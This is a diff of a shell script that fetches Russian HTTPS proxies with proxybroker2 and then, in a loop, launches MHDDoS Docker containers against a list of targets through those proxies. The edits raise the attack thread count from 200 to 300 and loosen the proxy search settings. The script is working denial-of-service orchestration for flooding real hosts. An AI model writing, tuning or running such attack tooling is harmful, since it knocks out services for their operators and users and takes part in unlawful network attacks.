@@ -59,7 +59,7 @@ fi
 
 rm /root/proxy/proxy.txt
 
-docker run -d -it --rm --volume="/root/proxy:/root/proxy" bluet/proxybroker2 --timeout 1 find --min-queue 20 --types HTTPS --countries RU -l 10000 --outfile /root/proxy/proxy.txt
+docker run -d -it --rm --volume="/root/proxy:/root/proxy" bluet/proxybroker2 --timeout 2 find --types HTTPS --countries RU -l 10000 --outfile /root/proxy/proxy.txt
 
 # docker run --name proxybroker --expose 8888 -p 8888:8888 -it --rm bluet/proxybroker2 --max-conn 2 --max-tries 1 --timeout 1 serve --host 0.0.0.0 --port 8888 --types HTTP HTTPS --countries RU
 
@@ -86,7 +86,7 @@ do
     dockerName=${dockerName//[:]/_}
     dockerName=${dockerName%%/*}
 
-    docker run --name=${dockerName} --volume="/root/proxy:/root/proxy" --label co.elastic.logs/module=docker -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 200 /root/proxy/reversed.txt 50 1200 --debug
+    docker run --name=${dockerName} --volume="/root/proxy:/root/proxy" --label co.elastic.logs/module=docker -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 300 /root/proxy/reversed.txt 50 1200 --debug
     # sleepTime=$(( $sleepTime - 1 ))
     counter=$(( $counter + 1 ))
   done
@@ -95,4 +95,3 @@ do
     sleep ${sleepTime}m
   fi
 done
-
